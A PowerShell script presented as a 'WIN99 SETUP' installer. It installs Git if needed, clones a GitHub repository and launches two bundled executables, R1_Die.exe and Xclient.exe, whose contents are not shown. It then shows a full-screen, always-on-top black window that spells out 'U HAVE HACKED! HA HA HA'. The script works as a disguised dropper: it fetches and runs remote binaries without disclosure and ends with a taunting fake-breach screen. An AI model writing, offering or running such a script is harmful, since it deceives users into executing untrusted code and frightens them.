# start.ps1

$ErrorActionPreference = "Stop"

# ============================================================
# USE THE DIRECTORY WHERE THE COMMAND WAS RUN
# ============================================================

$InstallDir = (Get-Location).Path
$RepoDir = Join-Path $InstallDir "win99"
$RepoUrl = "https://github.com/mineswrver/win99.git"

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "             WIN99 SETUP                " -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

Write-Host "[*] Install directory:" -ForegroundColor Cyan
Write-Host $InstallDir -ForegroundColor White
Write-Host ""

# ============================================================
# INSTALL GIT IF NEEDED
# ============================================================

if (-not (Get-Command git -ErrorAction SilentlyContinue)) {

    Write-Host "[*] Git not found." -ForegroundColor Yellow
    Write-Host "[*] Installing Git..." -ForegroundColor Cyan

    winget install --id Git.Git -e --source winget

    # Refresh PATH
    $env:Path =
        [Environment]::GetEnvironmentVariable("Path", "Machine") +
        ";" +
        [Environment]::GetEnvironmentVariable("Path", "User")
}

# ============================================================
# DOWNLOAD WIN99
# ============================================================

if (-not (Test-Path $RepoDir)) {

    Write-Host "[*] Downloading win99..." -ForegroundColor Cyan

    git clone $RepoUrl $RepoDir

    if ($LASTEXITCODE -ne 0) {
        Write-Host "[!] Git clone failed." -ForegroundColor Red
        exit 1
    }

    Write-Host "[+] win99 downloaded." -ForegroundColor Green

}
else {

    Write-Host "[+] win99 already exists." -ForegroundColor Green
}

# ============================================================
# USE THE DOWNLOADED DIRECTORY
# ============================================================

Set-Location $RepoDir

Write-Host ""
Write-Host "[*] Working directory:" -ForegroundColor Cyan
Write-Host $RepoDir -ForegroundColor White
Write-Host ""

# ============================================================
# CHECK EXECUTABLES
# ============================================================

$R1 = Join-Path $RepoDir "R1_Die.exe"
$XClient = Join-Path $RepoDir "Xclient.exe"

if (Test-Path $R1) {
    Write-Host "[+] R1_Die.exe found." -ForegroundColor Green
}
else {
    Write-Host "[-] R1_Die.exe not found." -ForegroundColor Yellow
}

if (Test-Path $XClient) {
    Write-Host "[+] Xclient.exe found." -ForegroundColor Green
}
else {
    Write-Host "[-] Xclient.exe not found." -ForegroundColor Yellow
}

# ============================================================
# LAUNCH EXECUTABLES
# ============================================================

if (Test-Path $R1) {

    Write-Host "[*] Launching R1_Die.exe..." -ForegroundColor Cyan

    Start-Process `
        -FilePath $R1 `
        -WorkingDirectory $RepoDir
}

if (Test-Path $XClient) {

    Write-Host "[*] Launching Xclient.exe..." -ForegroundColor Cyan

    Start-Process `
        -FilePath $XClient `
        -WorkingDirectory $RepoDir
}

# ============================================================
# SYSTEM ALERT
# ============================================================

Clear-Host

$Host.UI.RawUI.WindowTitle = "SYSTEM ALERT"
$Host.UI.RawUI.ForegroundColor = "Red"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form

$form.Text = "SYSTEM ALERT"
$form.BackColor = [System.Drawing.Color]::Black
$form.ForeColor = [System.Drawing.Color]::Red
$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$form.TopMost = $true

$label = New-Object System.Windows.Forms.Label

$label.Dock = [System.Windows.Forms.DockStyle]::Fill
$label.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$label.Font = New-Object System.Drawing.Font(
    "Arial",
    80,
    [System.Drawing.FontStyle]::Bold
)
$label.ForeColor = [System.Drawing.Color]::Red
$label.BackColor = [System.Drawing.Color]::Black

$form.Controls.Add($label)

$form.Show()

$messages = @(
    "U",
    "U HAVE",
    "U HAVE HACKED",
    "U HAVE HACKED!",
    "U HAVE HACKED! HA HA HA"
)

foreach ($message in $messages) {

    $label.Text = $message
    $form.Refresh()

    Start-Sleep -Seconds 1
}

Start-Sleep -Seconds 2

$form.Close()
$form.Dispose()
